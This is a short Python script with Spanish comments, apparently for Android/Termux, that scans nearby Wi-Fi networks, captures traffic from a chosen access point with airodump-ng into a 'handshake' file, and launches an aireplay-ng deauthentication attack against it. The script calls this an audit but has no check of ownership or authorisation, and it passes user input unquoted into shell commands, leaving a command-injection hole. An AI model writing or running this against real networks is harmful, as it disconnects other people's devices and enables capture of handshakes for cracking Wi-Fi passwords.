import subprocess

def run_command(command):
    """Ejecuta un comando de shell y muestra la salida"""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode()
    else:
        print(stderr.decode())
        return ""

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...")
    resultado = run_command("tsu -c 'iw dev wlan0 scan'")
    redes = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
    return redes

def capturar_paquetes(bssid, channel):
    """Capturar paquetes de una red específica"""
    print(f"Capturando paquetes de la red con BSSID {bssid} en el canal {channel}...")
    run_command(f"tsu -c 'airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0'")

def deauth_attack(bssid):
    """Realizar un ataque de desautenticación"""
    print(f"Realizando ataque de desautenticación contra {bssid}...")
    run_command(f"tsu -c 'aireplay-ng --deauth 10 -a {bssid} wlan0'")

def main():
    # Escanear redes Wi-Fi
    redes = scan_wifi()
    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red}")
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        
        bssid = input(f"Introduce el BSSID de la red {red_seleccionada}: ")
        canal = input(f"Introduce el canal de la red {red_seleccionada}: ")
        
        capturar_paquetes(bssid, canal)
        deauth_attack(bssid)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()






